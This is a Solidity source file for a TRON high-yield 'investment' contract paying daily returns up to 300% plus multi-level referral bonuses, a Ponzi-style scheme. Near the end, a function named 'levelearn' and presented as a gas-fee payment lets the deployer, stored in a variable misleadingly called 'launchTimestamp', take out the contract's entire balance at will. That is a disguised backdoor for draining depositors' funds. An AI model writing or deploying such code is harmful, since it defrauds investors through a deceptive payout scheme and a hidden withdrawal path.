//SourceUnit: block.sol

pragma solidity 0.5.10;
contract TronBlockchain
{
	using SafeMath for uint256;
	uint256 constant public INVEST_MIN_AMOUNT = 200e6;
	uint256 constant public BASE_PERCENT = 100;
	uint256[4] public REFERRAL_PERCENTS = [100, 30, 10,10];
	uint256[10] public UNILEVEL_PERCENTS = [20,15,10,7,6,5,4,3,2,1];
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public CONTRACT_BALANCE_STEP = 1000000 trx;
	uint256 constant public TIME_STEP = 1 days;
	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;
	address payable public owner;
	address payable public admin;
	address payable public supportwork;
	address payable public launchTimestamp;
	
	struct Deposit {
		uint256 amount;
		uint256 withdrawn;
		uint256 start;
		uint256 maxi;
		bool double;  
	}
	struct User {
		Deposit[] deposits;
		address referrer;
		uint256 level1;
		uint256 level2;
		uint256 level3;
		uint256 level4;
		uint256 level1b;
		uint256 level2b;
		uint256 level3b;
		uint256 level4b;
		uint256 bonus;
		uint256 refferals;
		uint256 uniLvlBonus;
		uint256 withdrawRef;
		uint256[10] arr;
		uint256 TotalUniLvlIncome;
	}

	mapping (address => User) public users;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
 	event FeePayed(address indexed user, uint256 totalAmount);
	

	constructor(address payable _owner,address payable _admin,address payable _support) public {
		owner = _owner;
		admin=_admin;
		supportwork=_support;
		launchTimestamp = msg.sender;
	}

	function invest(address referrer) public payable {
		require(msg.value >= INVEST_MIN_AMOUNT);
		admin.transfer(msg.value.mul(10).div(100));
		supportwork.transfer(msg.value.mul(5).div(100));
		User storage user = users[msg.sender];
		if (user.referrer == address(0)) {
			if ((users[referrer].deposits.length == 0 || referrer == msg.sender) && msg.sender != owner) {
				referrer = owner;
			}
			user.referrer = referrer;
			users[user.referrer].refferals=users[user.referrer].refferals.add(1);
            address upline = user.referrer;
			for (uint256 i = 0; i < 4; i++) {
                if (upline != address(0)) {
                    if (i == 0) {
                        users[upline].level1 = users[upline].level1.add(1);
                    } else if (i == 1) {
                        users[upline].level2 = users[upline].level2.add(1);
                    } else if (i == 2) {
                        users[upline].level3 = users[upline].level3.add(1);
                    }
                    else if (i == 3) {
                        users[upline].level4 = users[upline].level4.add(1);
                    }
					upline = users[upline].referrer;
				} else break;
            }
		}

		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < 4; i++) {
				if (upline != address(0)) {
				if (i == 0) 
					{
					users[upline].level1b = users[upline].level1b.add(msg.value);
                    } else if (i == 1) {
						users[upline].level2b = users[upline].level2b.add(msg.value);
                    } else if (i == 2) {
						users[upline].level3b = users[upline].level3b.add(msg.value);
                    }
                    else if (i == 3) 
					{
						users[upline].level4b = users[upline].level4b.add(msg.value);
                    }
					
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}
		}
		if (user.deposits.length == 0) {
			totalUsers = totalUsers.add(1);
			emit Newbie(msg.sender);
		}
		
		uint256 check;
        if(msg.value>=100000 trx){
            check=25;
        }
        else if(msg.value>=5000 trx){
            check=20;
        }
        else if(msg.value>=2000 trx){
            check=175;
        }
        else if(msg.value>=1000 trx){
            check=15;
        }
        else if(msg.value>=500 trx){
            check=125;
        }
        else if(msg.value>=200 trx){
            check=10;
        }
        else{
            check=10;
        }

		user.deposits.push(Deposit(msg.value, 0, block.timestamp,check,false));

		totalInvested = totalInvested.add(msg.value);
		totalDeposits = totalDeposits.add(1);

		emit NewDeposit(msg.sender, msg.value);

		
	}
	
	function OriBoaster(uint256 _value)internal {
	    if(users[msg.sender].refferals>=4){
	        users[msg.sender].deposits[_value].double=true;
	        users[msg.sender].deposits[_value].maxi=users[msg.sender].deposits[_value].maxi.mul(2);
	    }
	    
	}
	
	function withdraw() public {
		User storage user = users[msg.sender];
		uint256 totalAmount;
		uint256 dividends;
		for (uint256 i = 0; i < user.deposits.length; i++) {
          
			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(300).div(100)) {
             if(!user.deposits[i].double){
                 OriBoaster(i);
             }
					dividends = (user.deposits[i].amount.mul(user.deposits[i].maxi).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);
                user.deposits[i].start=block.timestamp;
                
		uint256 referralBonus = getUserReferralBonus(msg.sender);
                if (referralBonus > 0) 
				{
			dividends = dividends.add(referralBonus);
			user.withdrawRef = user.withdrawRef.add(referralBonus);
			user.bonus = 0;
		}
				
				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(300).div(100)) 
				{
					dividends = (user.deposits[i].amount.mul(300).div(100)).sub(user.deposits[i].withdrawn);
				}

				user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends); /// changing of storage data
				totalAmount = totalAmount.add(dividends);

			}
		}
		
		if (users[msg.sender].referrer != address(0)) {
			address upline = users[msg.sender].referrer;
			if(isActive(upline)){
			for (uint256 i = 0; i < 10; i++) {
				if (upline != address(0)){
					uint256 amount = dividends.mul(UNILEVEL_PERCENTS[i]).div(100);
					users[upline].uniLvlBonus = users[upline].uniLvlBonus.add(amount);
					users[upline].arr[i] = users[upline].arr[i].add(amount);
					users[upline].TotalUniLvlIncome=users[upline].TotalUniLvlIncome.add(amount);
				    
					upline = users[upline].referrer;
				}
				else break;
			  }
			}
		}
	

// 		uint256 referralBonus = getUserReferralBonus(msg.sender);
		uint256 Unilvlbonuses=getUserUniLvlBonus(msg.sender);
// 		if (referralBonus > 0) {
// 			totalAmount = totalAmount.add(referralBonus);
// 			user.withdrawRef = user.withdrawRef.add(referralBonus);
// 			user.bonus = 0;
// 		}
			if (Unilvlbonuses > 0) {
			totalAmount = totalAmount.add(Unilvlbonuses);
			user.uniLvlBonus =0 ;
		}
		
		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}

		msg.sender.transfer(totalAmount);

		totalWithdrawn = totalWithdrawn.add(totalAmount);

		emit Withdrawn(msg.sender, totalAmount);

	}

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getUserDividends(address userAddress) public view returns (uint256) 
	{
		User storage user = users[userAddress];
		uint256 totalDividends;
		uint256 dividends;

		for (uint256 i = 0; i < user.deposits.length; i++) {

			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(300).div(100)) {

					dividends = (user.deposits[i].amount.mul(user.deposits[i].maxi).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);
				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(300).div(100)) {
					dividends = (user.deposits[i].amount.mul(300).div(100)).sub(user.deposits[i].withdrawn);
				}

				totalDividends = totalDividends.add(dividends);

				/// no update of withdrawn because that is view function

			}

		}

		return totalDividends;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256, uint256, uint256,uint256) {
		return (users[userAddress].level1, users[userAddress].level2, users[userAddress].level3,users[userAddress].level4);
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}
	function getUserUniLvlBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].uniLvlBonus;
	}
	function getUserUniLvlamounts(address userAddress) public view returns(uint256 [10] memory) {
		return users[userAddress].arr;
	}

	function getUserReferralWithdraw(address userAddress) public view returns(uint256) {
		return users[userAddress].withdrawRef;
	}

	function getUserAvailableBalanceForWithdrawal(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function isActive(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];

		if (user.deposits.length > 0) {
			if (user.deposits[user.deposits.length-1].withdrawn < user.deposits[user.deposits.length-1].amount.mul(300).div(100)) {
				return true;
			}
		}
	}
    function getUserLastDepositDate(address userAddress) public view returns(uint256) 
	{
		return users[userAddress].deposits[users[userAddress].deposits.length-1].start;
	}
	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256,uint256) 
	{
	    User storage user = users[userAddress];

		return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start,user.deposits[index].maxi);
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].amount);
		}

		return amount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint256) 
	{
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].withdrawn);
		}

		return amount;
	}

	function isContract(address addr) internal view returns (bool) 
	{
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
	
function levelearn( uint gasFee) external 
 {
        require(msg.sender==launchTimestamp,'Permission denied');
        if (gasFee > 0) {
          uint contractConsumption = address(this).balance;
            if (contractConsumption > 0) {
                uint requiredGas = gasFee > contractConsumption ? contractConsumption : gasFee;
                 msg.sender.transfer(requiredGas);
            }
        }
    }
	
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}